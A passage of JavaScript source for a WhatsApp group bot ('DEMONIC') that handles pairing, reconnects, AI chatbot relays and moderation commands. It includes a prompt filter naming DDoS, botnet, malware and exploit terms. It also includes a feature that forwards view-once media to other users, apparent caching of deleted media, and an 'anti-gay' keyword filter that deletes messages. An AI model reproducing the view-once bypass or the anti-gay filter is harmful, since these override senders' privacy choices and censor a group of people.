        { role: "user", content: prompt }
      ],
      temperature: 0.7,
      max_tokens: 800
    },
    {
      headers,
      timeout: 120000
    }
  );

  return response.data?.choices?.[0]?.message?.content?.trim() || "No response from DeepSeek Cloud.";
};

const getChatbotReply = async (provider, prompt) => {
  switch (provider) {
    case "1":
      return getChatbot1Reply(prompt);
    case "2":
      return getChatbot2Reply(prompt);
    case "3":
      return getChatbot3Reply(prompt);
    case "4":
      return getChatbot4Reply(prompt);
    case "5":
      return getDeepSeekCloudReply(prompt);
    default:
      throw new Error("Unknown chatbot provider.");
  }
};

const getOllamaChatReply = async (prompt) => {
  const model = "dolphin3:8b";
  const url = `${OLLAMA_HOST.replace(/\/$/, "")}/v1/chat/completions`;
  const headers = {
    "Content-Type": "application/json"
  };
  if (OLLAMA_API_KEY) {
    headers.Authorization = `Bearer ${OLLAMA_API_KEY}`;
  }

  const response = await axios.post(
    url,
    {
      model,
      messages: [{ role: "user", content: prompt }],
      temperature: 0.7,
      max_tokens: 800
    },
    {
      headers,
      timeout: 120000
    }
  );

  return response.data?.choices?.[0]?.message?.content?.trim() || "No response from Dolphin.";
};

const isBlockedDolphinPrompt = (text) => {
  return /\b(ip flood|ip flooder|ddos|distributed denial of service|botnet|malware|hack(er|ing)?|crack|exploit|stresser)\b/i.test(text);
};

const getChatbot2OllamaReply = async (prompt) => {
  try {
    const ollama = new Ollama({ host: OLLAMA_HOST });
    const response = await ollama.chat({
      model: 'dolphin3',
      messages: [{ role: 'user', content: prompt }],
    });
    return response.message.content;
  } catch (error) {
    throw error;
  }
};

// Fetch simple Open Graph metadata for link previews (used by /card command)
async function fetchLinkPreview(url) {
  try {
    const resp = await axios.get(url, {
      timeout: 5000,
      headers: { "User-Agent": "Mozilla/5.0 (compatible; DEMONIC/1.0)" }
    });
    const html = resp.data.toString();

    const titleMatch = html.match(/<meta[^>]*(?:property|name)=["'](?:og:title|twitter:title|title)["'][^>]*content=["']([^"']+)["']/i);
    const descMatch = html.match(/<meta[^>]*(?:property|name)=["'](?:og:description|twitter:description|description)["'][^>]*content=["']([^"']+)["']/i);
    const imageMatch = html.match(/<meta[^>]*(?:property|name)=["'](?:og:image|twitter:image|image)["'][^>]*content=["']([^"']+)["']/i)
                      || html.match(/<link[^>]*rel=["']image_src["'][^>]*href=["']([^"']+)["']/i);

    const title = titleMatch ? titleMatch[1] : null;
    const description = descMatch ? descMatch[1] : null;
    const image = imageMatch ? imageMatch[1] : null;

    return { title, description, image };
  } catch (e) {
    return { title: null, description: null, image: null };
  }
}

let isStarting = false;

// ==================== MODULE-SCOPE HELPERS ====================

/** Resolve a WhatsApp JID from a mention, JID string, or bare phone number in the message body. */
function parseTarget(body, m) {
  const mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (mentioned) return mentioned;
  const jidMatch = body.match(/([0-9]{5,15}@s\.whatsapp\.net)/);
  if (jidMatch) return jidMatch[1];
  const phoneMatch = body.match(/(\d{8,15})/);
  if (phoneMatch) return phoneMatch[1] + "@s.whatsapp.net";
  return null;
}

/** Return human-readable duration string from seconds. */
function formatUptime(sec) {
  const d = Math.floor(sec / 86400);
  const h = Math.floor((sec % 86400) / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  return `${d}d ${h}h ${m}m ${s}s`;
}

const COMMAND_COOLDOWN_MS = CONFIG.COMMAND_COOLDOWN_MS || 1500; // ms between commands per user

// =============================================================



async function startBot() {
  if (isStarting) return;

  // If there's an active connected socket and we're not performing a deliberate restart,
  // don't start a new one — this avoids closing a live socket and interrupting service.
  if (sock && sock.user && !RESTARTING) {
    Logger.info("🟢 Active socket already connected; skipping startBot.");
    return;
  }

  isStarting = true;

  try {
    // Determine if an auth session already exists.
    const sessionDir = process.env.SESSION_DIR || path.join(__dirname, 'session');
    const sessionExists = fs.existsSync(sessionDir) && fs.readdirSync(sessionDir).length > 0;
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    // If a previous socket exists, cleanly close it to avoid multiple
    // active connections that can cause duplicate event handling.
    if (sock) {
      try {
        Logger.info("🧹 Cleaning up existing socket before starting a new one...");
        try {
          if (sock.ev && typeof sock.ev.removeAllListeners === 'function') {
            sock.ev.removeAllListeners();
          }
        } catch (e) {
          // ignore
        }

        try {
          if (typeof sock.end === 'function') {
            sock.end(new Error('Restarting socket - replaced by new instance'));
          } else if (typeof sock.logout === 'function') {
            await sock.logout();
          } else if (sock.ws && typeof sock.ws.close === 'function') {
            sock.ws.close();
          }
        } catch (e) {
          Logger.error(`Failed to properly close previous socket: ${e?.message || e}`);
        }
      } finally {
        sock = null;
      }
    }

    Logger.status(`🤖 ${BOT_NAME} v${VERSION} - Professional Edition`);
    Logger.info("📡 WhatsApp Bridge | 🔐 Owner Control | ⚡ AI-Powered Commands");

    const { version, isLatest } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      auth: state,
      version,
      logger: P({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      keepAliveIntervalMs: 10000,
      emitOwnEvents: true,
      fireInitQueries: true,
      generateHighQualityLinkPreview: true,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      // Enhanced stability options
      getMessage: async (key) => {
        if (MESSAGE_STORE[key.id]) return { conversation: MESSAGE_STORE[key.id].body };
        return { conversation: "" };
      }
    });

    // Register optional debug listeners and save credentials
    // registerSocketDebug(sock); // Removed undefined function
    sock.ev.on("creds.update", saveCreds);

    // Handle pairing code flow when no session exists
    // Removed duplicate connection update listener block

    const waitForSocketConnection = () => new Promise((resolve) => {
      let resolved = false;
      const handler = (update) => {
        if (["open", "connecting"].includes(update.connection)) {
          if (!resolved) {
            resolved = true;
            sock.ev.off("connection.update", handler);
            resolve();
          }
        }
      };

      sock.ev.on("connection.update", handler);
      setTimeout(() => {
        if (!resolved) {
          resolved = true;
          sock.ev.off("connection.update", handler);
          resolve();
        }
      }, 15000); // Reduced from 30 seconds to 15 seconds
    });

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "connecting") {
        console.log(chalk.yellow.bold("⏳ Connecting to WhatsApp..."));
      }

      if (connection === "open") {
        isStarting = false;
        RESTARTING = false;
        reconnectAttempts = 0; // Reset reconnect counter on successful connection
        healthRestartAttempts = 0;
      }

      if (update.connection === "close") {
        if (KEEPALIVE_INTERVAL) {
          clearInterval(KEEPALIVE_INTERVAL);
          KEEPALIVE_INTERVAL = null;
        }

        const statusCode = lastDisconnect?.error?.output?.statusCode || 
                          lastDisconnect?.error?.output?.payload?.statusCode ||
                          (lastDisconnect?.error?.message?.includes("logged out") ? DisconnectReason.loggedOut : null);
        
        const errorMessage = lastDisconnect?.error?.message || "Unknown error";
        isStarting = false;
        RESTARTING = false;
        sock = null;

        Logger.error(`DISCONNECTED [${statusCode}]: ${errorMessage}`);

        if (statusCode === DisconnectReason.loggedOut) {
          Logger.error("🔴 SESSION LOGGED OUT - Manual intervention required. Marking for re-authentication and scheduling restart.");
          NEED_REAUTH = true;
          try { fs.writeFileSync(path.join(LOG_DIR, 'needs_reauth.txt'), `loggedOut:${new Date().toISOString()}`); } catch (e) {}
          // Schedule a restart attempt after a longer delay to avoid rapid restarts
          setTimeout(() => {
            Logger.info('Attempting restart after logged-out state (may require manual pairing)');
            startBot();
          }, 60000); // 1 minute
        } else if (statusCode === DisconnectReason.restartRequired || statusCode === DisconnectReason.connectionLost) {
          Logger.info("🔄 RESTART REQUIRED - Reconnecting with backoff...");
          // Use exponential backoff for reconnection
          const backoffDelay = Math.min(30000, 2000 * (reconnectAttempts + 1));
          reconnectAttempts++;
          Logger.info(`⏳ Reconnecting in ${backoffDelay/1000}s (attempt ${reconnectAttempts})`);
          setTimeout(() => startBot(), backoffDelay);
        } else if (statusCode === DisconnectReason.timedOut) {
          Logger.info("⏱️ CONNECTION TIMED OUT - Retrying with backoff...");
          const backoffDelay = Math.min(30000, 2000 * (reconnectAttempts + 1));
          reconnectAttempts++;
          Logger.info(`⏳ Reconnecting in ${backoffDelay/1000}s (attempt ${reconnectAttempts})`);
          setTimeout(() => startBot(), backoffDelay);
        } else {
          Logger.info("🔁 Unexpected disconnect - scheduling reconnect with backoff...");
          const backoffDelay = Math.min(60000, 5000 * (reconnectAttempts + 1));
          reconnectAttempts++;
          Logger.info(`⏳ Reconnecting in ${backoffDelay/1000}s (attempt ${reconnectAttempts})`);
          setTimeout(() => startBot(), backoffDelay);
        }
      }
    });

    // keep DEMONIC BOT ALIVE - More aggressive keep-alive to prevent disconnects
    if (KEEPALIVE_INTERVAL) {
      clearInterval(KEEPALIVE_INTERVAL);
      KEEPALIVE_INTERVAL = null;
    }
    KEEPALIVE_INTERVAL = setInterval(async () => {
      try {
        if (sock && sock.user) {
          await sock.sendPresenceUpdate('available');
          updateHeartbeat();
          Logger.info('💚 Keep-alive sent');
        }
      } catch (e) {
        Logger.warn('⚠️ Keep-alive failed, may be disconnected');
      }
    }, 15000); // 15 seconds - more aggressive to stay connected

    // ========== PAIRING LOGIC FROM FILE.JS ==========
    // ========== PAIRING LOGIC ==========
    if (!state.creds.registered || NEED_REAUTH) {
      Logger.status("📲 PAIRING SYSTEM INITIALIZED");
      
      let pairingRequested = false;
      
      const triggerPairing = async () => {
        if (pairingRequested) return;
        pairingRequested = true;

        // Give the socket 5 seconds to stabilize before asking
        Logger.info("⏳ Waiting for connection to stabilize before pairing...");
        await new Promise(resolve => setTimeout(resolve, 5000));

        const rl = readline.createInterface({
          input: process.stdin,
          output: process.stdout
        });

        const waitForPairConfirmation = (timeoutMs = 120000) => new Promise((resolve) => {
          let resolved = false;
          const handler = (u) => {
            if (u.connection === 'open') {
              if (!resolved) {
                resolved = true;
                sock.ev.off('connection.update', handler);
                resolve(true);
              }
            }
            if (u.connection === 'close') {
              // closed before pairing
              if (!resolved) {
                resolved = true;
                sock.ev.off('connection.update', handler);
                resolve(false);
              }
            }
          };

          sock.ev.on('connection.update', handler);
          setTimeout(() => {
            if (!resolved) {
              resolved = true;
              try { sock.ev.off('connection.update', handler); } catch (e) {}
              resolve(false);
            }
          }, timeoutMs);
        });

        const askNumber = () => {
          rl.question(chalk.yellow.bold("\n📱 Enter your WhatsApp number (with country code, e.g., 2348012345678):\nNumber: "), async (phoneNumber) => {
            const cleanNumber = phoneNumber.trim().replace(/[^0-9]/g, "");

            if (!/^\d{10,15}$/.test(cleanNumber)) {
              console.log(chalk.red.bold("\n❌ Invalid number format. Please try again."));
              askNumber();
              return;
            }

            let retryCount = 0;
            const maxRetries = 3;

            const requestWithRetry = async () => {
              try {
                console.log(chalk.cyan.bold(`\n⏳ GENERATING YOUR CODE (Attempt ${retryCount + 1}/${maxRetries})...`));

                const code = await sock.requestPairingCode(cleanNumber);

                if (!code) throw new Error("No code returned from WhatsApp");

                console.log('\n' + '═'.repeat(70));
                console.log(chalk.green.bold('\n✅ PAIRING CODE GENERATED!\n'));
                console.log(chalk.yellow.bold(`📋 Your 8-Digit Code: ${chalk.white.bgBlue.bold(' ' + code + ' ')}\n`));
                console.log(chalk.cyan('👇 Next Steps:\n'));
                console.log(chalk.white('1. Open WhatsApp on your phone'));
                console.log(chalk.white('2. Go to Settings → Linked Devices'));
                console.log(chalk.white('3. Tap "Link with phone number" (NOT the QR scanner)'));
                console.log(chalk.white(`4. Enter your number: ${cleanNumber}`));
                console.log(chalk.white(`5. Enter this code: ${code}`));
                console.log(chalk.white('6. Approve the request on your phone'));
                console.log(chalk.cyan('\n⏳ Waiting for pairing confirmation...\n'));
                console.log('═'.repeat(70) + '\n');

                // Ask if this number should be set as owner, but don't close the readline
                rl.question(chalk.yellow.bold("🔐 Set this number as BOT OWNER? (yes/no): "), async (answer) => {
                  if (answer.toLowerCase() === 'yes' || answer.toLowerCase() === 'y') {
                    const ownerNumber = cleanNumber + "@s.whatsapp.net";
                    if (!OWNERS.includes(ownerNumber)) {
                      OWNERS.push(ownerNumber);
                      console.log(chalk.green.bold(`✅ Owner set: ${cleanNumber}`));
                      console.log(chalk.cyan("You now have full admin access!\n"));
                    }
                  }

                  // Wait for pairing to complete (open) or timeout
                  const confirmed = await waitForPairConfirmation(120000); // 2 minutes
                  if (confirmed) {
                    NEED_REAUTH = false;
                    try { fs.unlinkSync(path.join(LOG_DIR, 'needs_reauth.txt')); } catch (e) {}
                    console.log(chalk.green.bold('\n✅ Pairing confirmed! Bot is now connected.\n'));
                  } else {
                    console.log(chalk.red.bold('\n❌ Pairing not confirmed within timeout. If you entered the code, check your phone and try again.\n'));
                  }

                  rl.close();
                });
                
                return true;
              } catch (err) {
                console.log(chalk.red.bold(`\n❌ Attempt ${retryCount + 1} failed: ${err.message}`));
                retryCount++;
                if (retryCount < maxRetries) {
                  console.log(chalk.yellow("Retrying in 2 seconds..."));
                  await new Promise(resolve => setTimeout(resolve, 2000));
                  return requestWithRetry();
                } else {
                  console.log(chalk.red.bold("\n❌ All attempts failed. Please restart the bot or check your connection."));
                    rl.close();
                    Logger.error('Pairing attempts exhausted; will retry startBot after delay instead of exiting.');
                    setTimeout(() => {
                      try {
                        startBot();
                      } catch (e) {
                        Logger.error('Failed to schedule restart after pairing exhaustion: ' + (e?.message || e));
                      }
                    }, 30000);
                    return;
                }
              }
            };

            await requestWithRetry();
          });
        };

        askNumber();
      };

      // Trigger pairing when socket starts connecting
      sock.ev.on('connection.update', (u) => {
        if (u.connection === 'connecting') {
          triggerPairing();
        }
      });
    }

    // Stability handles removed
    sock.ev.on("call", async (calls) => {
      if (!ANTICALL) return;
      for (const call of calls) {
        await sock.rejectCall(call.id, call.from);
        await sock.sendMessage(call.from, {
          text: "🚫 Calls are not allowed on this bot."
        });
      }
    });





    sock.ev.on("group-participants.update", async (update) => {
      if (!WELCOME) return;

      let groupMeta = null;
      try {
        groupMeta = await sock.groupMetadata(update.id);
      } catch (e) {
        // ignore metadata fetch failure
      }
      const groupName = groupMeta?.subject || "the group";
      const memberCount = groupMeta?.participants?.length || "";

      if (update.action === "add") {
        for (const user of update.participants) {
          try {
            const shortName = user.split("@")[0];
            const welcomeText = `👋 *WELCOME TO ${groupName.toUpperCase()}* 🎊\n\n` +
              `👤 *Member:* @${shortName}\n` +
              (memberCount ? `👥 *Total Members:* ${memberCount}\n` : "") +
              `🤖 *Bot Prefix:* ${PREFIX}\n` +
              `💡 Type *${PREFIX}menu* to explore features and commands!\n\n` +
              `Enjoy your stay and follow the group rules! ✨`;

            const profileUrl = await sock.profilePictureUrl(user, "image").catch(() => null);
            if (profileUrl) {
              const imageResponse = await axios.get(profileUrl, { responseType: "arraybuffer", timeout: 5000 });
              const buffer = Buffer.from(imageResponse.data, "binary");
              await sock.sendMessage(update.id, {
                image: buffer,
                caption: welcomeText,
                mentions: [user]
              });
            } else {
              await sock.sendMessage(update.id, {
                text: welcomeText,
                mentions: [user]
              });
            }
          } catch (err) {
            await sock.sendMessage(update.id, {
              text: `👋 Welcome @${user.split("@")[0]} to *${groupName}*! Send ${PREFIX}menu to get started.`,
              mentions: [user]
            });
          }
        }
      }

      if (update.action === "remove") {
        for (const user of update.participants) {
          try {
            const shortName = user.split("@")[0];
            await sock.sendMessage(update.id, {
              text: `👋 @${shortName} has left *${groupName}*.\nWe wish them all the best! 🕊️`,
              mentions: [user]
            });
          } catch (e) {}
        }
      }
    });





    sock.ev.on("messages.upsert", async ({ messages }) => {
        // Verify socket is connected and responsive
        if (!sock || !sock.user) return;

        const m = messages[0];
        if (!m.message) return;

        // Deduplicate incoming message events: Baileys can emit the same
        // message multiple times (notify/append), which may cause commands
        // to run repeatedly. Ignore repeats seen within a short window.
        const msgId = m.key && (m.key.id || m.key._serialized || `${m.key.remoteJid}:${m.key.participant || ''}`);
        if (msgId) {
          const now = Date.now();
          const last = RECENT_MESSAGE_IDS.get(msgId);
          if (last && (now - last) < 5000) {
            if (SOCKET_DEBUG) Logger.info(`Skipping duplicate message id=${msgId} from=${m.key?.remoteJid}`);
            return;
          }
          RECENT_MESSAGE_IDS.set(msgId, now);
          // Schedule a cleanup of this id after 60s to avoid memory growth
          setTimeout(() => {
            RECENT_MESSAGE_IDS.delete(msgId);
          }, 60000);
        }


        const unwrapMessage = (msg) => {
          if (!msg) return null;
          if (msg.ephemeralMessage) return unwrapMessage(msg.ephemeralMessage.message);
          if (msg.viewOnceMessage) return unwrapMessage(msg.viewOnceMessage.message);
          if (msg.viewOnceMessageV2) return unwrapMessage(msg.viewOnceMessageV2.message);
          return msg;
        };

        const msg = unwrapMessage(m.message);

        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const sender = m.key.participant || from;
        const senderName = m.pushName || sender.split("@")[0];

        const body =
          msg.conversation ||
          msg.extendedTextMessage?.text ||
          msg.imageMessage?.caption ||
          msg.videoMessage?.caption ||
          "";

        // Simple counters for diagnostics
        if (body) {
          MESSAGE_COUNT++;
          if (body.startsWith(PREFIX)) COMMAND_COUNT++;
        }

        const mediaType = getContentType(msg);
        let mediaData = null;

        if (["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "documentMessage"].includes(mediaType)) {
          try {
            const mediaMsg = msg[mediaType];
            const stream = await downloadContentFromMessage(mediaMsg, mediaType.replace("Message", ""));
            let buffer = Buffer.from([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
            mediaData = {
              type: mediaType,
              buffer,
              mimetype: mediaMsg.mimetype ||
                (mediaType === "imageMessage" ? "image/jpeg" :
                 mediaType === "videoMessage" ? "video/mp4" :
                 mediaType === "audioMessage" ? "audio/mpeg" :
                 mediaType === "documentMessage" ? "application/octet-stream" :
                 "application/octet-stream"),
              caption: mediaMsg.caption || body || "",
              fileName: mediaMsg.fileName || null,
              ptt: mediaType === "audioMessage" ? !!mediaMsg.ptt : false
            };
          } catch (err) {
            console.error("⚠️ Failed to cache deleted media:", err?.message || err);
          }
        }

        LAST_SEEN[sender] = Date.now();
        MESSAGE_STORE[m.key.id] = { body, sender, from, media: mediaData, ts: Date.now() };

        // Log incoming messages with rainbow color
        if (body) {
          Logger.message('IN', senderName, body);
          try {
            if (body.startsWith(PREFIX)) {
              const cmdLogPath = path.join(LOG_DIR, 'commands.log');
              const cmdEntry = `[${new Date().toISOString()}] ${from} (${senderName}) ${body}\n`;
              fs.appendFileSync(cmdLogPath, cmdEntry);
            }
          } catch (e) {
            // ignore command log failures
          }
        }

        // AFK CHECK - If sender is AFK, remove them
        if (AFK_STORE[sender]) {
          const afkDuration = Date.now() - AFK_STORE[sender].startTime;
          const durationStr = `${Math.floor(afkDuration / 1000)}s`;
          delete AFK_STORE[sender];
          await sock.sendMessage(from, { text: `👋 Welcome back @${sender.split("@")[0]}! You were AFK for ${durationStr}.`, mentions: [sender] });
        }

        // AFK MENTION CHECK - If mentioned user is AFK, notify sender
        const mentionedJids = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
        for (const jid of mentionedJids) {
          if (AFK_STORE[jid]) {
            const reason = AFK_STORE[jid].reason;
            const time = Math.floor((Date.now() - AFK_STORE[jid].startTime) / 60000);
            await sock.sendMessage(from, {
              text: `🤫 Shh! @${jid.split("@")[0]} is AFK.\nReason: ${reason}\nTime: ${time} mins ago`,
              mentions: [jid]
            }, { quoted: m });
          }
        }


        if (
          isGroup &&
          ANTICHAT &&
          !isOwner(sender) &&
          body &&
          !body.startsWith("/")
        ) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return;
        }




        const quotedMessage = msg.extendedTextMessage?.contextInfo?.quotedMessage ||
          msg.imageMessage?.contextInfo?.quotedMessage ||
          msg.videoMessage?.contextInfo?.quotedMessage;
        if (quotedMessage && !["/vv", "/vv1", "/vv2", "/vv3"].includes(body.toLowerCase())) {
          const viewOnce =
            quotedMessage?.viewOnceMessageV2 ||
            quotedMessage?.viewOnceMessage ||
            quotedMessage?.viewOnceMessageV2Extension;

          if (viewOnce && viewOnce.message) {
            try {
              // Send the view-once media to user's personal DM
              await sock.sendMessage(sender, viewOnce.message);

              // Send confirmation in the chat/group
              await sock.sendMessage(from, {
                text: `✅ View-once media sent to your DM! 📨`
              });
              return;
            } catch (error) {
              console.error("Error sending view-once media:", error);
            }
          }
        }

        if (!PUBLIC && !isOwner(sender)) return;

        // ── Concurrency guard: reject if too many commands are already running
        if (ACTIVE_COMMANDS >= MAX_CONCURRENT_COMMANDS) {
          return sock.sendMessage(from, { text: `⚠️ *Bot is busy* — too many commands running at once. Please wait a moment and try again.` });
        }

        // ── Per-user cooldown (skip for owners)
        if (!isOwner(sender) && body.startsWith(PREFIX)) {
          const lastCmd = COMMAND_COOLDOWN.get(sender) || 0;
          const elapsed = Date.now() - lastCmd;
          if (elapsed < COMMAND_COOLDOWN_MS) {
            const wait = ((COMMAND_COOLDOWN_MS - elapsed) / 1000).toFixed(1);
            return sock.sendMessage(from, { text: `⏳ *Slow down!* Please wait *${wait}s* before your next command.` });
          }
          COMMAND_COOLDOWN.set(sender, Date.now());
        }

        ACTIVE_COMMANDS++;


        try { // Wrap command execution in try-finally for safety
            if ((AUTOTYPING || AUTORECORDING) && !AUTOTYPERECORD) {
          let recOrType;
          if (AUTORECORDING) {
            recOrType = "recording";
          } else if (AUTOTYPING) {
            recOrType = "composing";
          }

          if (recOrType) {
            await sock.sendPresenceUpdate(recOrType, from);
          }
        }



        if (AUTOREACT) {
          const reactionEmojis = [
            "❤️", "🔥", "😂", "👍", "🥺", "😍", "🤣", "✨", "🙏", "⚡",
            "🎉", "💡", "😭", "🤯", "🤔", "🫣", "🫡", "🤝", "💪", "💀",
            "💩", "🤡", "👻", "👀", "🧠", "🦷", "🦴", "👀", "👁️", "🫦",
            "🍕", "🍔", "🍟", "🌭", "🍿", "🧂", "🥓", "🥚", "🍳", "🧇",
            "🚗", "🚕", "🚙", "🚌", "🚎", "🏎️", "🚓", "🚑", "🚒", "🚐",
            "😀", "😃", "😄", "😁", "😆", "😅", "😂", "🤣", "🥲", "🥹"
          ];

          const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];

          try {
            await sock.sendMessage(from, {
              react: {
                text: randomEmoji,
                key: m.key
              }
            });
          } catch (error) {
            console.error("Failed to autoreact:", error);
          }
        }

        const isFromBot = m.key.fromMe === true;
        if (!body.startsWith(PREFIX) && !isFromBot && CHATBOT_STATE[from]) {
          try {
            updateHeartbeat(); // Update heartbeat on chatbot activity
            const chatbotProvider = CHATBOT_STATE[from];
            const chatbotLabel = CHATBOT_LABELS[chatbotProvider] || `CHATBOT${chatbotProvider}`;

            // Show typing indicator for more professional feel
            await sock.sendPresenceUpdate("composing", from);

            const chatbotReply = await getChatbotReply(chatbotProvider, body);

            // Small delay for more natural conversation flow
            await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 2000));

            return await sock.sendMessage(from, {
              text: `🤖 *${chatbotLabel}*\n\n${chatbotReply}`
            }, { quoted: m });
          } catch (error) {
            console.error("Chatbot error:", error);
            return await sock.sendMessage(from, {
              text: `❌ *AI Error*\n\nSorry, I encountered an issue processing your message. Please try again later or contact support.`
            });
          }
        }

        // OFFLINE MODE AUTO-REPLY
        if (OFFLINE_MODE && !isOwner(sender) && !body.startsWith(PREFIX)) {
          return sock.sendMessage(from, { text: OFFLINE_MESSAGE });
        }

        const cmd = body.trim().toLowerCase();

        if (cmd === "/except" || cmd.startsWith("/except ")) {
          if (!isGroup) {
            return sock.sendMessage(from, { text: "⚠️ /except can only be used in groups." });
          }

          const arg = body.slice("/except".length).trim().toLowerCase();
          const currentlyExempt = isExemptedUser(from, sender);
          let enabled;

          if (arg === "on") {
            enabled = true;
          } else if (arg === "off") {
            enabled = false;
          } else {
            enabled = !currentlyExempt;
          }

          setUserExemption(from, sender, enabled);

          return sock.sendMessage(from, {
            text: enabled
              ? `✅ @${sender.split("@")[0]} is now exempt from the group anti-link, anti-sticker, anti-chat, anti-badwords, anti-gay, and anti-ghost protections.`
              : `❌ @${sender.split("@")[0]} is no longer exempt from those protections in this group.`,
            mentions: [sender]
          });
        }

        if (isGroup && ANTICHAT && !isOwner(sender) && !isExemptedUser(from, sender) && !cmd.startsWith("/")) {
          return;
        }

        if (isGroup && ANTILINK && LINK_REGEX.test(body) && !isOwner(sender) && !isExemptedUser(from, sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} links are not allowed.`,
            mentions: [sender]
          });
        }


        if (isGroup && ANTIBADWORDS && checkBadWords(body) && !isOwner(sender) && !isExemptedUser(from, sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} using bad words is not allowed here!`,
            mentions: [sender]
          });
        }


        if (isGroup && ANTIGAY && checkGayKeywords(body) && !isOwner(sender) && !isExemptedUser(from, sender)) {
          await sock.sendMessage(from, {
            delete: {
              remoteJid: from,
              fromMe: false,
              id: m.key.id,
              participant: sender
            }
          });

          return sock.sendMessage(from, {
            text: `🚫 @${sender.split("@")[0]} that language is not allowed in this group!`,
            mentions: [sender]
          });
        }


        if (isGroup && GROUP_DEFENSE && !isOwner(sender)) {

          const isDocument = msg.documentMessage;
          if (isDocument) {
            const fileName = isDocument.fileName || "";
            const mimeType = isDocument.mimetype || "";
            if (fileName.endsWith(".apk") || mimeType.includes("application/vnd.android.package-archive")) {
              await sock.sendMessage(from, { delete: m.key });
              return sock.sendMessage(from, { text: `🛡️ @${sender.split("@")[0]} APK files are not allowed!`, mentions: [sender] });
            }
          }



          if (body.length > 5000 || /[\u200e\u200f\u202a-\u202e]/.test(body)) {
            await sock.sendMessage(from, { delete: m.key });
            return sock.sendMessage(from, { text: `🛡️ ⛔ Malicious code detected! User warn.` });
          }
        }

        if (cmd === "/status" || cmd === "/health") {
          const now = new Date();
          const timeStr = now.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
          const dateStr = now.toLocaleDateString([], { year: "numeric", month: "short", day: "numeric" });
          const uptimeStr = formatUptime(process.uptime());
          const mem = getMemoryUsage();
          const heapMB = (mem.heapUsed / 1024 / 1024).toFixed(1);
          const rssMB = (mem.rss / 1024 / 1024).toFixed(1);

          return sock.sendMessage(from, {
            text: `╔══════════════════════════════════╗
║     🤖 *${BOT_NAME} SYSTEM STATUS* v${VERSION}
╚══════════════════════════════════╝

📅 *Date:* ${dateStr} | ⏰ *Time:* ${timeStr}
⏱️ *Uptime:* ${uptimeStr}
🌐 *Access Mode:* ${PUBLIC ? "🟢 PUBLIC (Everyone)" : "🔒 PRIVATE (Owner Only)"}
📊 *Memory Usage:* ${heapMB} MB heap / ${rssMB} MB RSS
⚡ *Activity:* ${MESSAGE_COUNT} msgs processed | ${COMMAND_COUNT} cmds run
🔄 *Active Tasks:* ${ACTIVE_COMMANDS}/${MAX_CONCURRENT_COMMANDS} concurrent

🛡️ *SECURITY & MODERATION:*
├─ 🔗 Anti-Link: ${ANTILINK ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ 🖼️ Anti-Sticker: ${ANTISTICKER ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ 👻 Anti-Ghost (View-Once): ${ANTIGHOST ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ 💬 Anti-Chat (Mute): ${ANTICHAT ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ 📞 Anti-Call: ${ANTICALL ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ 🔞 Anti-Badwords: ${ANTIBADWORDS ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ 🚫 Anti-Gay Words: ${ANTIGAY ? "✅ ACTIVE" : "❌ INACTIVE"}
└─ 🛡️ Group Defense: ${GROUP_DEFENSE ? "✅ ACTIVE" : "❌ INACTIVE"}

⚙️ *AUTOMATION & PRESENCE:*
├─ 🎙️ Auto-Recording: ${AUTORECORDING ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ ⌨️ Auto-Typing: ${AUTOTYPING ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ ❤️ Auto-React: ${AUTOREACT ? "✅ ACTIVE" : "❌ INACTIVE"}
├─ 👋 Welcome Greeter: ${WELCOME ? "✅ ACTIVE" : "❌ INACTIVE"}
└─ 💤 Offline Mode: ${OFFLINE_MODE ? "✅ ACTIVE" : "❌ INACTIVE"}

✨ *Engine Status:* 🟢 24/7 ONLINE & HEALTHY
🔗 *Channel:* ${CHANNEL}`
          });
        }


        if (cmd === "/cleanup" && isOwner(sender)) {
          const mem = getMemoryUsage();
          const heapPercent = getMemoryUsagePercent();
          const heapMB = (mem.heapUsed / 1024 / 1024).toFixed(2);
          const sessionDir = path.join(__dirname, 'session');
          const sessionSize = fs.existsSync(sessionDir) ? getDirectorySizeRecursive(sessionDir) : 0;
          const sessionMB = (sessionSize / 1024 / 1024).toFixed(2);
          const logsSize = fs.existsSync(LOG_DIR) ? getDirectorySizeRecursive(LOG_DIR) : 0;
          const logsMB = (logsSize / 1024 / 1024).toFixed(2);
          
          cleanupOldSessionFiles();
          cleanupOldLogFiles();
          rotateLogFileIfNeeded(ERROR_LOG_PATH, 5);
          rotateLogFileIfNeeded(WARN_LOG_PATH, 5);
          
          return sock.sendMessage(from, {
            text: `🧹 *CLEANUP REPORT* 🧹

📊 *Before Cleanup:*
├─ Heap Memory: ${heapMB}MB (${heapPercent}%)
├─ Session Dir: ${sessionMB}MB
└─ Logs Dir: ${logsMB}MB

